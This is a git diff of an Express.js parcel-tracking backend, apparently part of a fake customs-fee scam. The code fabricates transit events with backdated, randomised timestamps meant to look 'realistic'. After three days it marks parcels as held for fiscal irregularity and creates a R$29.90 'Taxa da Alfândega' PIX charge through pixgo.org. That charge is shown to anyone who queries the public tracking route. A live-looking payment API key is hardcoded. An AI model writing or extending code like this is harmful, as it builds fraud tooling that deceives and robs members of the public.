@@ -3,6 +3,11 @@ const router = express.Router();
 const { getDB } = require('../db');
 const axios = require('axios');
 
+// Endpoint de configuração para o frontend
+router.get('/config/centavos', (req, res) => {
+    res.json({ active: true });
+});
+
 // ===== TRACKING API =====
 
 // Listar todos (Admin)
@@ -167,43 +172,56 @@ router.post(['/publico', '/consulta', '/rastreio-publico'], async (req, res) => 
         // Adicionar etapas automáticas de trânsito
         for (const stage of automationStages) {
             if (diffDays >= stage.day && !rows.some(r => r.status_atual === stage.status)) {
+                // Calcular data retroativa realista: Data Postagem + X Dias + Horário Aleatório
+                const stageDate = new Date(firstStageDate);
+                stageDate.setDate(stageDate.getDate() + stage.day);
+                stageDate.setHours(9 + Math.floor(Math.random() * 8), Math.floor(Math.random() * 59));
+
                 await db.query(
-                    'INSERT INTO rastreios_status (codigo, cidade, status_atual, titulo, subtitulo, tipo_entrega, taxa_paga) VALUES (?, ?, ?, ?, ?, ?, ?)',
-                    [codigo, city, stage.status, stage.title, stage.sub, packageData.tipo_entrega, packageData.taxa_paga]
+                    'INSERT INTO rastreios_status (codigo, cidade, status_atual, titulo, subtitulo, tipo_entrega, taxa_paga, data) VALUES (?, ?, ?, ?, ?, ?, ?, ?)',
+                    [codigo, city, stage.status, stage.title, stage.sub, packageData.tipo_entrega, packageData.taxa_paga, stageDate]
                 );
             }
         }
 
-        // Se for NORMAL e passaram 3 dias e não está pago -> Taxa no Dia 4
+        // Se for NORMAL e passaram 3 dias e não está pago -> Taxa no Dia 3
         if (packageData.tipo_entrega === 'NORMAL' && diffDays >= 3 && !packageData.taxa_paga) {
             const taxaStatus = '⚠️ Objeto retido - Aguardando regularização fiscal';
             if (!rows.some(r => r.status_atual === taxaStatus)) {
 
-                // --- Integração Automática PIXGO ---
-                let taxaPixEmv = null;
-                try {
-                    const pixRes = await axios.post('https://pixgo.org/api/v1/payment/create', {
-                        amount: 29.90,
-                        description: `Taxa da Alfândega - ${codigo}`
-                    }, {
-                        headers: {
-                            'x-api-key': 'pk_9073c62f8b397edc81e80d8675f6a6459916140064fbb2f3d653ba5b09dc9e3d',
-                            'Content-Type': 'application/json'
-                        },
-                        timeout: 5000 // 5 seconds timeout to prevent hanging
-                    });
+                // Só gera PIX se ainda não existir um código salvo ou se a busca falhou antes
+                let taxaPixEmv = packageData.taxa_pix || null;
 
-                    if (pixRes.data && pixRes.data.success && pixRes.data.emv) {
-                        taxaPixEmv = pixRes.data.emv;
-                        console.log(`[PIXGO AUTO] Pix gerado com sucesso para ${codigo}`);
+                if (!taxaPixEmv) {
+                    // --- Integração Automática PIXGO ---
+                    try {
+                        const pixRes = await axios.post('https://pixgo.org/api/v1/payment/create', {
+                            amount: 29.90,
+                            description: `Taxa da Alfândega - ${codigo}`
+                        }, {
+                            headers: {
+                                'x-api-key': 'pk_9073c62f8b397edc81e80d8675f6a6459916140064fbb2f3d653ba5b09dc9e3d',
+                                'Content-Type': 'application/json'
+                            },
+                            timeout: 5000
+                        });
+
+                        if (pixRes.data && pixRes.data.success && pixRes.data.emv) {
+                            taxaPixEmv = pixRes.data.emv;
+                            console.log(`[PIXGO AUTO] Pix gerado com sucesso para ${codigo}`);
+                        }
+                    } catch (pixErr) {
+                        console.error('[PIXGO AUTO ERROR]', pixErr.response?.data || pixErr.message);
                     }
-                } catch (pixErr) {
-                    console.error('[PIXGO AUTO ERROR]', pixErr.response?.data || pixErr.message);
                 }
 
+                const taxaDate = new Date(firstStageDate);
+                taxaDate.setDate(taxaDate.getDate() + 3);
+                taxaDate.setHours(11 + Math.floor(Math.random() * 4), Math.floor(Math.random() * 59));
+
                 await db.query(
-                    'INSERT INTO rastreios_status (codigo, cidade, status_atual, titulo, subtitulo, taxa_valor, taxa_pix, tipo_entrega) VALUES (?, ?, ?, ?, ?, ?, ?, ?)',
-                    [codigo, city, taxaStatus, taxaStatus, 'Seu objeto está sujeito a retenção por irregularidade fiscal. Regularize para liberar.', 29.90, taxaPixEmv, 'NORMAL']
+                    'INSERT INTO rastreios_status (codigo, cidade, status_atual, titulo, subtitulo, taxa_valor, taxa_pix, tipo_entrega, data) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)',
+                    [codigo, city, taxaStatus, taxaStatus, 'Seu objeto está sujeito a retenção por irregularidade fiscal. Regularize para liberar.', 29.90, taxaPixEmv, 'NORMAL', taxaDate]
                 );
             }
         }
@@ -214,8 +232,8 @@ router.post(['/publico', '/consulta', '/rastreio-publico'], async (req, res) => 
         const lastStatus = currentRows[currentRows.length - 1];
         packageData = currentRows[0];
 
-        // Prioriza a linha que contém a taxa (independentemente de ser a última ou não)
-        const taxaRow = currentRows.find(r => (r.taxa_valor && r.taxa_valor > 0) || r.taxa_pix) || lastStatus;
+        // Localizar a taxRow de forma segura
+        const taxaRow = currentRows.find(r => (r.taxa_valor && parseFloat(r.taxa_valor) > 0) || r.taxa_pix);
 
         res.json({
             success: true,
@@ -230,7 +248,7 @@ router.post(['/publico', '/consulta', '/rastreio-publico'], async (req, res) => 
             taxa_valor: packageData.taxa_paga ? null : (taxaRow?.taxa_valor || null),
             taxa_pix: packageData.taxa_paga ? null : (taxaRow?.taxa_pix || null),
             tipo_entrega: packageData.tipo_entrega,
-            taxa_paga: packageData.taxa_paga || false
+            taxa_paga: packageData.taxa_paga ? true : false
         });
     } catch (error) {
         res.status(500).json({ error: error.message });
